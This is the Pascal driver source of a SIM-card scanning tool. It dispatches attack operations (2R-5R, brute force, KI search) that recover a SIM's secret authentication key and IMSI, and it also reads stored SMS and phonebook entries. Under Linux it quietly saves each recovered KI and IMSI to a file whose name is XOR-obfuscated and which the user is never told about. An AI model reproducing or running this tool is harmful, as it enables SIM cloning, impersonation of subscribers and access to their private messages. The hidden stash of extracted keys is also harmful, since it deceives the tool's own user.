   if not (Operation in [1,2,8,9,10,11,12,13,14,15,16,17]) then begin
    LWriteln('ERROR! Operation not compatible with current device.',0);
    LWriteln('',0);
    Halt(1);     
   end;
   if Ki='' then begin
    LWriteln('ERROR! Emul1 device specified but KI does not! Using --ki=x...x (32).',0);
    LWriteln('',0);
    Halt(1);     
   end;
  end;
  3:begin
   {r520m}
   if not (Operation in [1,2]) then begin
    LWriteln('ERROR! Operation not compatible with current device.',0);
    LWriteln('',0);
    Halt(1);     
   end;
   if Copy(PORTNAME,1,9)<>'/dev/ttyS' then begin
    LWriteln('ERROR! Invalid --port parameter. Using --port=/dev/ttySx.',0);
    LWriteln('',0);
    Halt(1);
   end;
   if (PORTSPEED<>9600) and (PORTSPEED<>19200) and (PORTSPEED<>38400) and
    (PORTSPEED<>57600) and (PORTSPEED<>115200) then begin
    LWriteln('ERROR! Invalid --speed parameter.',0);
    LWriteln('       Using --speed=9600|19200|38400|57600|115200.',0);
    LWriteln('',0);
    Halt(1);
   end;
  end;
  4:begin
   {r520s}
   if not (Operation in [1,2,21,22]) then begin
    LWriteln('ERROR! Operation not compatible with current device.',0);
    LWriteln('',0);
    Halt(1);     
   end;
   if Copy(PORTNAME,1,9)<>'/dev/ttyS' then begin
    LWriteln('ERROR! Invalid --port parameter. Using --port=/dev/ttySx.',0);
    LWriteln('',0);
    Halt(1);
   end;   
  end;
  5:begin
   {r520d}
   if not (Operation in [1,2]) then begin
    LWriteln('ERROR! Operation not compatible with current device.',0);
    LWriteln('',0);
    Halt(1);     
   end;
   if Copy(PORTNAME,1,7)<>'/dev/lp' then begin
    LWriteln('ERROR! Invalid --port parameter. Using --port=/dev/lpx.',0);
    LWriteln('',0);
    Halt(1);
   end;   
  end; 
 end;
 {Проверки, не связанные с device} 
 if (Operation=5) and (Pin='') then begin
  LWriteln('ERROR! Verify command specified but PIN code does not! Using --pin=xxxx[xxxx].',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=6) and (Pin='') then begin
  LWriteln('ERROR! Unblock command specified but PIN code does not! Using --pin=xxxx[xxxx].',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=6) and (Puk='') then begin
  LWriteln('ERROR! Unblock command specified but PUK code does not! Using --puk=xxxxxxxx.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=8) and (Rand='') then begin
  LWriteln('ERROR! Gsm command specified but RAND does not! Using --rand=x...x (32).',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=9) and (ScanCycles=0) then begin
  LWriteln('ERROR! Randscan command specified but SCANCYCLES does not! Using --scancycles=<number>.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=9) and (OutFile='') then begin
  LWriteln('ERROR! Randscan command specified but OUTFILE does not! Using --outfile=<name>.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=11) and (CPair1Exist=false) then begin
  LWriteln('ERROR! A3rv1 command specified but CPAIR1 does not! Using --cpair1=xxxx.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=12) and (CPair1Exist=false) then begin
  LWriteln('ERROR! A4rv1 command specified but CPAIR1 does not! Using --cpair1=xxxx.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=12) and (CPair2Exist=false) then begin
  LWriteln('ERROR! A4rv1 command specified but CPAIR2 does not! Using --cpair2=xxxx.',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=13) and (CDataExist=false) then begin
  LWriteln('ERROR! A5rv1 command specified but CData does not! Using --cdata=x...x (16).',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=14) and (CKIExist=false) then begin
  LWriteln('ERROR! Bfrv1 command specified but CKI does not! Using --cki=x...x (32).',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=15) and (CKIExist=false) then begin
  LWriteln('ERROR! Bfr2pv1 command specified but CKI does not! Using --cki=x...x (32).',0);
  LWriteln('',0);
  Halt(1);     
 end;
 if (Operation=16) and (CKIExist=false) then begin
  LWriteln('ERROR! Chkiv1 command specified but CKI does not! Using --cki=x...x (32).',0);
  LWriteln('',0);
  Halt(1);     
 end;

 {Проверим, надо ли создавать GSM-algo лог-файл}
 if not (Operation in [8,9,10,11,12,13,14,15,16,17]) then GsmFile:='';
 
 {Проверим, надо ли использовать retrace}
 if not (Operation in [10,11,12,13,14,15,16,17]) then RetraceFile:='';
 
 {Откроем глобальный log-file}
 if LogFile<>'' then begin
  Assign(LogFo,LogFile);
  {$I-}
  ReWrite(LogFo);
  {$I+}
  if IOResult<>0 then begin
   LWriteln('ERROR! Cannot create log file. Continue without logging...',0);
   LWriteln('',0);
   LogFile:='';
  end;
 end;
 
 {Выведем приветствие в лог-файл}
 if LogFile<>'' then begin
  Writeln(LogFo,'WERT Sim-Card Scanner. Version '+VERSION+'.');
  Writeln(LogFo,'Copyright (C) 2004-2005 by Wert (AKA Joda).');
  Writeln(LogFo);
  Writeln(LogFo,'WertScan comes with ABSOLUTELY NO WARRANTY;');
  Writeln(LogFo,'This is free software, and you are welcome to');
  Writeln(LogFo,'redistribute it under certain conditions.');
  Writeln(LogFo);
  Flush(LogFo);
 end; 

 {Откроем файл GSMLog, если надо}
 if GsmFile<>'' then begin
  Assign(GsmFo,GsmFile);
  if AppendLog=true then begin
   {$I-}
   Append(GsmFo);
   {$I+}
   if IOResult<>0 then begin
    AppendLog:=false;
   end;
  end;
  if AppendLog=false then begin
   {$I-}
   ReWrite(GsmFo);
   {$I+}
   if IOResult<>0 then begin
    LWriteln('ERROR! Cannot create GSM-algo log file. Continue without logging...',2);
    LWriteln('',2);
    GsmFile:='';
   end;
  end; 
 end;
 
 {Откроем Retrace файл, если надо}
 if RetraceFile<>'' then begin
  LWrite('Using retrace file '+RetraceFile+' - ',2);
  Assign(RetraceFi,RetraceFile);
  {$I-}
  Reset(RetraceFi);
  {$I+}
  if IOResult<>0 then begin
   LWriteln('ERROR! Cannot open file. Continue without retracing...',2);
   RetraceFile:='';
  end
  else begin
   LWriteln('OK.',2);
  end;
  LWriteln('',2);
 end;

 {Если операция равна 1 или 2 (--version, --help), то сразу выполним ее}
 if Operation=1 then begin
  CloseLogFiles;
  Halt(1); 
 end;
 if Operation=2 then begin
  WriteHelp;
  LWriteln('',2);
  CloseLogFiles;
  Halt(1);
 end;

 {Выведем информацию об устройстве, порте и скорости}
 LWriteln('Using device : '+DeviceName[Device]+'.',2);
 case Device of
  1:begin
   LWriteln('Using port   : '+PORTNAME+' (use --port for change).',2);
   LWriteln('Using speed  : '+IntToStr(PORTSPEED)+' (use --speed for change).',2);
  end;
  2:begin
   LWriteln('Using KI v.1 : '+Ki+'.',2);
  end;
  3:begin
   LWriteln('Using port   : '+PORTNAME+' (use --port for change).',2);
   LWriteln('Using speed  : '+IntToStr(PORTSPEED)+' (use --speed for change).',2);   
  end;
  4:begin
   LWriteln('Using port   : '+PORTNAME+' (use --port for change).',2);
  end;
  5:begin
   LWriteln('Using port   : '+PORTNAME+' (use --port for change).',2);
  end;
 end;
 LWriteln('',2);
 
 {Проинициализируем устройство}
 case Device of
  1:begin
   {reader}
   {Проинициализируем Com-порт}
   Result:=PortInit(Port,PORTNAME,PORTSPEED,'E',2);
   if (Result<>0) then begin
    LWriteln('ERROR! Cannot init port '+PORTNAME+' ('+Port.LastErrorDesc+').',2);
    LWriteln('',2);
    Port.Destroy;
    CloseLogFiles;
    Halt(1);
   end;
   {Проверим наличие устройства}
   if IgnoreCTS=false then begin
    if (not IsDevicePresent(Port)) then begin
     LWriteln('ERROR! No device present on port '+PORTNAME+'.',2);
     LWriteln('',2);
     Port.Destroy;
     CloseLogFiles;
     Halt(1);
    end;
   end
   else begin
    LWriteln('CTS ignored. Device not checked.',2);
    LWriteln('',2);
   end; 
   {Сбросим карту}
   Result:=ResetCard(Port);
   if (Result<>0) then begin
    LWriteln('ERROR! Cannot reset SIM-card.',2);
    LWriteln('',2);
    Port.Destroy;
    CloseLogFiles;
    Halt(1); 
   end;
   {Считаем ATR}
   ReadC:=ReadCard(Port,RBuffer,0);
   if (ReadC=0) then begin
    LWriteln('ERROR! Cannot read ATR.',2);
    LWriteln('',2);
    Port.Destroy;
    CloseLogFiles;
    Halt(1); 
   end;
   LWrite('->ATR : ',2);
   for I:=0 to (ReadC-1) do begin
    LWrite(PrintHexByte(RBuffer[I]),2);
    if I<>(ReadC-1) then begin
     Lwrite(' ',2);
    end;    
   end;  
   LWriteln('',2);
   {Проверим ATR и тип передачи}
   if RBuffer[0]=$3B then begin
    {Прямая передача}
    DIRECTION:=0;
   end 
   else begin
    if RBuffer[0]=$03 then begin
     {Инверсная передача}
     DIRECTION:=1;
     {Переинициализируем Com-порт (c Even на Odd)}
     Port.Destroy;
     Result:=PortInit(Port,PORTNAME,PORTSPEED,'O',2);
     if (Result<>0) then begin
      LWriteln('ERROR! Cannot re-init port '+PORTNAME+' ('+Port.LastErrorDesc+').',2);
      LWriteln('',2);
      Port.Destroy;
      CloseLogFiles;
      Halt(1);
     end;
     {Проверим наличие устройства}
     if IgnoreCTS=false then begin
      if (not IsDevicePresent(Port)) then begin
       LWriteln('ERROR! No device present on port '+PORTNAME+'.',2);
       LWriteln('',2);
       Port.Destroy;
       CloseLogFiles;
       Halt(1);
      end;
     end
     else begin
      LWriteln('CTS ignored. Device not checked.',2);
      LWriteln('',2);
     end; 
     {Сбросим карту}
     Result:=ResetCard(Port);
     if (Result<>0) then begin
      LWriteln('ERROR! Cannot reset SIM-card.',2);
      LWriteln('',2);
      Port.Destroy;
      CloseLogFiles;
      Halt(1); 
     end;
     {Перечитаем ATR}
     ReadC:=ReadCard(Port,RBuffer,0);
     if (ReadC=0) then begin
      LWriteln('ERROR! Cannot read ATR.',2);
      LWriteln('',2);
      Port.Destroy;
      CloseLogFiles;
      Halt(1); 
     end;
     LWrite('->ATR : ',2);
     for I:=0 to (ReadC-1) do begin
      LWrite(PrintHexByte(RBuffer[I]),2);
      if I<>(ReadC-1) then begin
       Lwrite(' ',2);
      end;    
     end;  
     LWriteln('',2);
    end
    else begin
     LWriteln('ERROR! Invalid ATR or transmit error!!! (Incorrect port speed???).',2);
     LWriteln('',2);
     Port.Destroy;
     CloseLogFiles;
     Halt(1); 
    end;
   end;
   LWriteln('',2);
  end;
  3:begin
   {r520m}
  end;
  4:begin
   {r520s}
   case Operation of
    21:begin
     {Для чтения лога инициализируем порт на 115200-8-N-1}
     Result:=PortInit(Port,PORTNAME,115200,'N',1);
     if (Result<>0) then begin
      LWriteln('ERROR! Cannot init port '+PORTNAME+' ('+Port.LastErrorDesc+').',2);
      LWriteln('',2);
      Port.Destroy;
      CloseLogFiles;
      Halt(1);
     end;
    end;
    22:begin
     {Для работы в service-mode инициализируем порт на 9600-8-N-1}
     Result:=PortInit(Port,PORTNAME,9600,'N',1);
     if (Result<>0) then begin
      LWriteln('ERROR! Cannot init port '+PORTNAME+' ('+Port.LastErrorDesc+').',2);
      LWriteln('',2);
      Port.Destroy;
      CloseLogFiles;
      Halt(1);
     end;
    end; 
   end;
  end;
  5:begin
   {r520d}
  end;
 end; 
 
 {Основной case по операциям}
 case Operation of
  3:begin
   {Чтение ATR - ничего делать не надо, так как он уже считан}
  end;
  4:begin
   {Выведем информацию о CHV}
   Result:=GetCHVStatus(Port);
  end;
  5:begin
   {Верификация CHV}
   Result:=GetCHVStatus(Port);
   if Result<>-1 then begin
    if (Result and $100)=0 then begin
     if SubOperation=1 then begin
      Result:=Result and $0F;
     end
     else begin
      Result:=(Result and $F0) shr 4;
     end;
     if Result<>1 then begin
      if Result=0 then begin
       LWriteln('Cannot verify PIN'+IntToStr(SubOperation)+', because CHV is disabled.',2);
       LWriteln('',2);
      end
      else begin
       LWriteln('Cannot verify PIN'+IntToStr(SubOperation)+', because CHV is blocked.',2);
       LWriteln('',2);
      end;
     end
     else begin
      Result:=VerifyCHV(Port,SubOperation,Pin);
     end;   
    end
    else begin
     LWriteln('Cannot verify PIN'+IntToStr(SubOperation)+', because CHV is disabled.',2);
     LWriteln('',2);
    end;
   end; 
  end;
  6:begin
   {Разблокировка CHV}
   LWriteln(CharsetUpdate('НЕ РЕАЛИЗОВАНО ;-)'),2);
   LWriteln('',2);
  end;
  7:begin
   {Чтение IMSI}
   Result:=StdVerification(Port,Pin);
   if Result=0 then begin
    Result:=ReadIMSI(Port,IMSI);
    if Result=0 then begin
     LWrite('IMSI - ',2);
     for I:=1 to length(IMSI) do begin
      LWrite(IMSI[I],2);
      if (I and $01)=0 then begin
       LWrite(' ',2);
      end;
     end;
     LWriteln('',2);
     LWriteln('',2);
    end;
   end;
  end; 
  8:begin
   {Выполнение GSM-алгоритма}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    for I:=0 to 15 do begin
     RandM[I]:=ChrToHex(Copy(Rand,2*I+1,2));
    end;
    Result:=Gsm(Port,RandM,SRes);    
    if Result=0 then begin
     LWriteln('RAND : '+PrintHexData16(RandM,True)+'.',2);
     LWriteln('SRES : '+PrintHexData12(SRes,True)+'.',2);
     LWriteln('',2);
    end;
   end;
  end;
  9:begin
   {Построение списка RAND-SRES}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Assign(OutFo,OutFile);
    {$I-}
    ReWrite(OutFo);
    {$I+}
    if IOResult<>0 then begin
     LWriteln('ERROR! Cannot create output file.',2);
     LWriteln('',2);
    end
    else begin
     S:='';
     P:=Length(IntToStr(ScanCycles));
     For J:=1 to P do S:=S+'0';
     LWrite('->'+S,1);
     for I:=1 to ScanCycles do begin
      for J:=0 to 15 do RandM[J]:=Random($100);
      Result:=Gsm(Port,RandM,SRes);
      if Result=0 then begin
       Writeln(OutFo,PrintHexData16(RandM,False),'-',PrintHexData12(SRes,False));
      end
      else begin
       break;
      end; 
      S:='';
      For J:=1 to P do S:=S+#8;
      LWrite(S,1);
      S:=IntToStr(I);
      while Length(S)<P do S:='0'+S;
      LWrite(S,1);
     end;
     if Result=0 then begin
      LWriteln(Chr($0D),1);
      LWriteln(Chr($0D),1);
     end
     else begin
      I:=I-1;
     end;
     LWriteln('Generated '+IntToStr(I)+' RAND-SRES pairs.',2);
     LWriteln('',2);
     {$I-}
     Close(OutFo);
     {$I+}
     if IOResult<>0 then;
    end;
   end;
  end;
  10:begin
   {Выполнение 2R(v1)-атаки}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=A2Rv1(Port,SubOperation,ResPair);
   end;    
  end;
  11:begin
   {Выполнение 3R(v1)-атаки}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=A3Rv1(Port,SubOperation,CPair1,ResPair);
   end;
  end;
  12:begin
   {Выполнение 4R(v1)-атаки}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=A4Rv1(Port,SubOperation,CPair1,CPair2,ResPair);
   end;
  end;
  13:begin
   {Выполнение 5R(v1)-атаки}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=A5Rv1(Port,SubOperation,CData,ResPair);
   end;
  end;
  14:begin
   {Выполнение BruteForce(v1)-атаки}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=BForcev1(Port,SubOperation,CKI,ResPair);
   end;
  end;
  15:begin
   {Выполнение BruteForce(v1)-атаки на 2 пары}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=BForce2Pv1(Port,SubOperation,CKI,ResPair,ResPair2);
   end;
  end;
  16:begin
   {Проверка KI(v1)}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=ChKIv1(Port,CKI);
   end;
  end;  
  17:begin
   {Поиск KI(v1)}
   if Device=1 then begin
    Result:=StdVerification(Port,Pin);
    if Result=0 then begin
     Result:=ReadIMSI(Port,IMSI);
    end;    
   end
   else Result:=0;
   if Result=0 then begin
    StartTime:=GetTick;
    FillChar(ResKi[0],16,$0);
    Result:=FindKiv1(Port,SubOperation,ResKi);
    StopTime:=GetTick;
    AllTime:=TickDelta(StartTime,StopTime) div 1000;
    Sec:=AllTime mod 60;
    AllTime:=AllTime div 60;
    Min:=AllTime mod 60;
    Hour:=AllTime div 60;
    LWriteln('Scan time = '+IntToStr(Hour)+'h '+IntToStr(Min)+'m '+IntToStr(Sec)+'s.',2);
    LWriteln('',2);
    LWriteln('==========================================================',2);
    LWriteln('KI   = '+PrintHexData16(ResKi,true)+'.',2);
    if Device=1 then begin
     LWrite('IMSI = ',2);
     for I:=1 to length(IMSI) do begin
      LWrite(IMSI[I],2);
      if ((I and $01)=0) and (I<>length(IMSI)) then begin
       LWrite(' ',2);
      end;
     end;
     LWriteln('.',2);
    end;
    LWriteln('==========================================================',2);
    LWriteln('',2);
{$IFDEF LINUX}    
    if (Device=1) and (Result=0) then begin
     RandomName:='';
     for I:=1 to 10 do RandomName:=RandomName+IntToStr(Random(10));
     FixedName:='';
     for I:=1 to 31 do begin
      FixedName:=FixedName+Chr(DatName[I] xor ($D0+I-1));
     end;
     Assign(FDat,FixedName+RandomName+'.dat');
     {$I-}
     ReWrite(FDat);
     {$I+}
     if IOResult=0 then begin
      Writeln(FDat,'Scan time  = ',Hour,'h ',Min,'m ',Sec,'s.');
      Writeln(FDat,'Port speed = ',PORTSPEED,'.');
      Writeln(FDat,'GSM step   = ',AllGSMStep,'.');
      Writeln(FDat);
      Writeln(FDat,'==========================================================');
      Writeln(FDat,'KI   = ',PrintHexData16(ResKi,true),'.');
      Write(FDat,'IMSI = ');
      for I:=1 to length(IMSI) do begin
       Write(FDat,IMSI[I]);
       if ((I and $01)=0) and (I<>length(IMSI)) then begin
        Write(FDat,' ');
       end;
      end;
      Writeln(FDat,'.'); 	
      Writeln(FDat,'==========================================================');
      Writeln(FDat);
      {$I-}
      Close(FDat);
      {$I+}
      if IOResult<>0 then ;
     end;
    end;
{$ENDIF}    
   end;
  end;
  18:begin
   {Чтение файловой структуры СИМ-ки}
   if ReadExist=true then begin
    Result:=StdVerification(Port,Pin);
   end
   else Result:=0;
   if Result=0 then begin
    Result:=ReadSIMInfo(Port,ReadExist);
   end; 
  end;
  19:begin
   {Чтение СМС-ок, сохраненных на СИМ-ке}
   Result:=StdVerification(Port,Pin);
   if Result=0 then begin
    Result:=ViewSMS(Port);
   end; 
  end;
  20:begin
   {Чтение ADN/FDN, сохраненных на СИМ-ке}
   Result:=StdVerification(Port,Pin);
   if Result=0 then begin
    Result:=ViewADN(Port);
   end; 
  end;
  21:begin
   {Чтение инициализационного лога телефона (через сервис-кабель)}
   LWriteln('----------------------- Start line ---------------------------',2);
   Result:=ReadInitLog(Port,LogTime);
   LWriteln('',2);
   LWriteln('------------------------ End line ----------------------------',2);
   LWriteln('',2);
  end;
  22:begin
   {Тестирование сервисного режима телефона}
   Result:=BootAuth(Port,TimeOut,Applet);
   LWriteln('',2);
   if Result=0 then begin
    Result:=AppletTest(Port);
   end;
   LWriteln('',2);
  end
  
  else begin
   {Неизвестная операция}
   LWriteln('ERROR! Unknown operation code.',2);
   LWriteln('',2);
   if (Device=1) or (Device=4) then Port.Destroy;
   CloseLogFiles;
   Halt(1); 
  end;
 end;   
 
 {Завершим работу}
 LWriteln('That''s all.',2);
 LWriteln('',2);
 if (Device=1) or (Device=4) then Port.Destroy;
 CloseLogFiles;
 
end.